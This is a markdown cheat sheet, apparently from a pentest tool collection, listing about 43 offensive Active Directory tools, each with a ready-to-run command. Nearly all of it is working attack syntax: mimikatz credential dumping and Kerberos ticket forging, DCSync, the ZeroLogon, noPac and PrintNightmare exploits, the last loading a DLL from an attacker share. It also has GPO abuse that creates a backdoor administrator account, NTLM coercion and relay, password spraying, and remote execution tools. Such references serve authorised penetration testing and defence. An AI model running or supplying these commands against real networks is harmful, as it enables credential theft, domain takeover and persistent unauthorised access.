# Active Directory & Lateral Movement
> Source: HackTools | Entries: 43 | Platform: cross_platform


## Index

- [active_directory](#activedirectory)
- [credential_dumping](#credentialdumping)
- [credential_validation](#credentialvalidation)
- [GPO Abuse](#gpo-abuse)
- [kerberos_attack](#kerberosattack)
- [kerberos_relay](#kerberosrelay)
- [Lateral Movement](#lateral-movement)
- [lateral_movement](#lateralmovement)
- [LDAP Enumeration](#ldap-enumeration)
- [ntlm_coercion](#ntlmcoercion)
- [ntlm_relay](#ntlmrelay)
- [password_spraying](#passwordspraying)
- [privilege_escalation](#privilegeescalation)


### active_directory

#### AS-REP Roasting
Active Directory attack technique targeting accounts with Kerberos pre-authentication disabled, allowing attackers to...
**Categories:** active_directory, credential_access, kerberos_attack, technique, offline_cracking
```
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat
```

#### DCSync
Active Directory attack technique that abuses directory replication permissions (DS-Replication-Get-Changes and DS-Re...
**Categories:** active_directory, credential_access, domain_attack, technique, lateral_movement
```
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

#### Golden Ticket
Kerberos attack technique that forges Ticket Granting Tickets (TGT) using the krbtgt account's NTLM hash, granting un...
**Categories:** active_directory, credential_access, kerberos_attack, technique, persistence, domain_dominance
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

#### Kerberoasting
Active Directory attack technique that requests Kerberos service tickets (TGS) for accounts with Service Principal Na...
**Categories:** active_directory, credential_access, kerberos_attack, technique, offline_cracking
```
GetUserSPNs.py domain.local/user:password -dc-ip 10.0.0.1 -request
```

#### noPac
Exploit tool for CVE-2021-42278 and CVE-2021-42287 (sAMAccountName/noPac) that allows low-privileged domain users to...
**Categories:** active_directory, privilege_escalation, exploit_tool, domain_attack, kerberos_attack
```
python3 noPac.py domain.local/user:password -dc-ip 10.0.0.1 --impersonate Administrator -dump
```

#### PrintNightmare
Exploit implementations for CVE-2021-1675 and CVE-2021-34527 (PrintNightmare) that abuse Windows Print Spooler servic...
**Categories:** active_directory, privilege_escalation, exploit_tool, remote_code_execution, critical_vulnerability
```
python3 CVE-2021-1675.py domain.local/user:password@target '\\attacker\share\evil.dll'
```

#### Silver Ticket
Kerberos attack technique that forges service tickets (TGS) using a compromised service account's NTLM hash, granting...
**Categories:** active_directory, credential_access, kerberos_attack, technique, persistence
```
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:HASH /user:Administrator /ptt
```

#### ZeroLogon
Exploit implementation for CVE-2020-1472 (Zerologon) that allows unauthenticated attackers to completely compromise A...
**Categories:** active_directory, privilege_escalation, exploit_tool, domain_attack, critical_vulnerability
```
python3 zerologon_tester.py DC01 10.0.0.1
```

### credential_dumping

#### Mimikatz
Post-exploitation credential dumping tool that extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets...
**Categories:** credential_dumping, lsass_access, kerberos_attack, pass_the_hash, golden_ticket
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

#### secretsdump.py
Impacket module that remotely dumps SAM, LSA secrets, cached credentials, and NTDS.dit from domain controllers over S...
**Categories:** credential_dumping, dcsync, remote_credential_access, smb_based_attack, active_directory
```
secretsdump.py domain/user:password@target
```

### credential_validation

#### CredNinja
Multithreaded credential validation tool that tests username/password combinations against Windows targets via SMB. I...
**Categories:** credential_validation, lateral_movement, smb_based_attack, network_attack
```
python3 CredNinja.py -a creds.txt -b hosts.txt
```

### GPO Abuse

#### GPOAbuse
Tool for abusing writable Group Policy Objects to achieve code execution, privilege escalation, or persistence in Act...
**Categories:** GPO Abuse, Privilege Escalation, Persistence, Lateral Movement, Code Execution
```
python3 gpoabuse.py corp.local/user:pass -gpo-id 6AC1786C-016F-11D2-945F-00C04fB984F9 -command 'net user backdoor P@ss123 /add && net localgroup administrators backdoor /add'
```

#### SharpGPOAbuse
C# tool for abusing writable Group Policy Objects to achieve privilege escalation and lateral movement. Adds immediat...
**Categories:** GPO Abuse, Privilege Escalation, Lateral Movement, Persistence, Code Execution
```
SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author NT AUTHORITY\SYSTEM --Command cmd.exe --Arguments '/c net user backdoor P@ss /add' --GPOName 'Default Domain Policy'
```

### kerberos_attack

#### Rubeus
C# toolset for raw Kerberos interaction and abuse. Performs AS-REP roasting, Kerberoasting, ticket requests, renewals...
**Categories:** kerberos_attack, kerberoasting, asrep_roasting, delegation_abuse, credential_access
```
Rubeus.exe kerberoast /outfile:hashes.txt
```

### kerberos_relay

#### KrbRelay
Kerberos relay tool that relays Kerberos AP-REQ authentication to other services on the same or different hosts. Enab...
**Categories:** kerberos_relay, privilege_escalation, active_directory, rbcd_abuse, local_privilege_escalation
```
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {752073A1-23F2-4396-85F0-8FDB879ED0ED} -rbcd S-1-5-... -port 10
```

### Lateral Movement

#### CrackMapExec / NetExec
Swiss army knife for network pentesting that automates credential testing and command execution across multiple proto...
**Categories:** Lateral Movement
```
crackmapexec smb 10.0.0.0/24 -u admin -p password --exec-method wmiexec -x whoami
```

#### Evil-WinRM
WinRM (Windows Remote Management) shell for penetration testing that provides PowerShell remoting capabilities with a...
**Categories:** Lateral Movement
```
evil-winrm -i 10.0.0.1 -u admin -p password
```

#### GoFetch
Tool that automates attack path execution based on BloodHound graph data. Maps lateral movement paths from current po...
**Categories:** Lateral Movement
```
GoFetch.exe -path graph.json
```

#### Impacket atexec.py
Executes commands on remote Windows hosts by creating scheduled tasks via the ATSVC named pipe (legacy AT protocol) o...
**Categories:** Lateral Movement
```
atexec.py domain/user:password@target whoami
```

#### Impacket dcomexec.py
Executes commands on remote Windows hosts via DCOM (Distributed COM) objects such as MMC20.Application, ShellWindows,...
**Categories:** Lateral Movement
```
dcomexec.py domain/user:password@target
```

#### Impacket psexec.py
Python implementation of PSExec-style remote command execution over SMB. Creates a service on the remote host via the...
**Categories:** Lateral Movement
```
psexec.py domain/user:password@target
```

#### Impacket smbexec.py
Remote command execution tool that leverages SMB service creation without uploading a binary to disk. Creates a Windo...
**Categories:** Lateral Movement
```
smbexec.py domain/user:password@target
```

#### Impacket wmiexec.py
Executes commands on remote Windows hosts via WMI (Windows Management Instrumentation) process creation. Uses DCOM to...
**Categories:** Lateral Movement
```
wmiexec.py domain/user:password@target
```

#### MailSniper
PowerShell tool for searching through email in Microsoft Exchange environments. Performs mailbox enumeration, email c...
**Categories:** Lateral Movement
```
Invoke-SelfSearch -Mailbox user@domain.com -ExchHostname mail.domain.com -Terms 'password','credentials'
```

#### PAExec
Open-source redistributable equivalent of Sysinternals PsExec. Provides remote command execution by deploying a servi...
**Categories:** Lateral Movement
```
paexec.exe \\target -u domain\admin -p password cmd.exe
```

#### RemCom
Open-source remote command execution tool functionally equivalent to PsExec. Deploys a service to the target system v...
**Categories:** Lateral Movement
```
remcom.exe \\target cmd.exe
```

#### Ruler
Tool for abusing Microsoft Exchange/Outlook features for reconnaissance, credential harvesting, and remote code execu...
**Categories:** Lateral Movement
```
ruler -k --domain example.com --email user@example.com -p password display
```

#### SCShell
Fileless lateral movement tool that abuses the Windows Service Control Manager (SCM) to change an existing service's...
**Categories:** Lateral Movement
```
SCShell.exe target XblAuthManager "C:\windows\system32\cmd.exe /c calc.exe" domain user pass
```

#### SharpExec
C# lateral movement framework implementing WMIExec, SMBExec, and PSExec methods. Provides authenticated remote comman...
**Categories:** Lateral Movement
```
SharpExec.exe -m=wmi -e=cmd.exe -c="/c whoami" -t=10.0.0.1 -d=domain -u=admin -p=pass
```

#### SharpMove
C# tool implementing various lateral movement techniques including SCM, task scheduler, WMI, DCOM, WinRM, and registr...
**Categories:** Lateral Movement
```
SharpMove.exe action=scm computername=target command="cmd /c whoami" username=admin password=pass
```

#### SharpRDP
Remote Desktop Protocol lateral movement tool that programmatically authenticates via RDP and executes commands by si...
**Categories:** Lateral Movement
```
SharpRDP.exe computername=target command="cmd /c whoami > C:\out.txt" username=admin password=pass
```

#### SharpWMI
C# implementation for WMI-based reconnaissance and lateral movement. Supports local and remote WMI queries, remote pr...
**Categories:** Lateral Movement
```
SharpWMI.exe action=exec computername=target command="cmd.exe /c whoami"
```

#### WMIOps
PowerShell-based WMI offensive operations script providing various WMI-based lateral movement and reconnaissance capa...
**Categories:** Lateral Movement
```
Invoke-ExecCommandWMI -ComputerName target -Command 'whoami' -User domain\admin -Pass password
```

### lateral_movement

#### CrackMapExec
Swiss army knife for pentesting Active Directory networks. Automates credential validation, command execution, and cr...
**Categories:** lateral_movement, credential_validation, password_spraying, active_directory, remote_execution
```
crackmapexec smb 192.168.1.0/24 -u admin -p Password123
```

### LDAP Enumeration

#### windapsearch
LDAP enumeration tool (available in Python and Go versions) that performs targeted Active Directory queries for users...
**Categories:** LDAP Enumeration, AD Reconnaissance, Cross-Platform, Targeted Queries, Privilege Discovery
```
windapsearch -d corp.local --dc 10.0.0.1 -u user@corp.local -p 'P@ss' --da
```

### ntlm_coercion

#### Coercer
Comprehensive NTLM authentication coercion tool that consolidates all known Windows coercion methods (MS-EFSRPC, MS-R...
**Categories:** ntlm_coercion, authentication_coercion, active_directory, rpc_abuse
```
coercer scan -t dc01.corp.local -u user -p pass -d corp.local
```

#### DFSCoerce
NTLM coercion tool abusing the Distributed File System (MS-DFSNM) protocol to force Windows domain controllers to aut...
**Categories:** ntlm_coercion, authentication_coercion, active_directory, dfs_abuse
```
python3 DFSCoerce.py -u user -p pass -d corp.local listener_ip dc01
```

#### PetitPotam
NTLM coercion tool that abuses the Encrypting File System Remote Protocol (MS-EFSRPC) to force Windows hosts to authe...
**Categories:** ntlm_coercion, authentication_coercion, active_directory, relay_attack
```
python3 PetitPotam.py listener_ip target_dc
```

#### SpoolSample
Abuses the Print Spooler service (MS-RPRN) to force Windows hosts to authenticate to an attacker-controlled server. L...
**Categories:** ntlm_coercion, authentication_coercion, active_directory, printer_bug
```
SpoolSample.exe target_dc listener_host
```

### ntlm_relay

#### ntlmrelayx
Impacket NTLM relay tool that intercepts NTLM authentication and relays it to target services. Supports relaying to S...
**Categories:** ntlm_relay, credential_relay, active_directory, lateral_movement, privilege_escalation
```
ntlmrelayx.py -t smb://192.168.1.100 -smb2support
```

### password_spraying

#### DomainPasswordSpray
PowerShell-based password spraying tool for Active Directory. Enumerates domain users via LDAP and tests a single pas...
**Categories:** password_spraying, active_directory, credential_access, powershell_attack
```
Invoke-DomainPasswordSpray -Password Winter2024!
```

#### Spray
Lightweight password spraying tool for Active Directory environments. Tests a single password against multiple accoun...
**Categories:** password_spraying, credential_access, active_directory, online_brute_force
```
spray.sh -smb 192.168.1.100 users.txt passwords.txt 1 1 corp.local
```

### privilege_escalation

#### KrbRelayUp
Universal local privilege escalation tool that automates the KrbRelay RBCD attack chain. Combines Kerberos relay with...
**Categories:** privilege_escalation, kerberos_relay, rbcd_abuse, local_privilege_escalation, active_directory
```
KrbRelayUp.exe relay -d corp.local -cn FAKEPC$ -cp Password123!
```
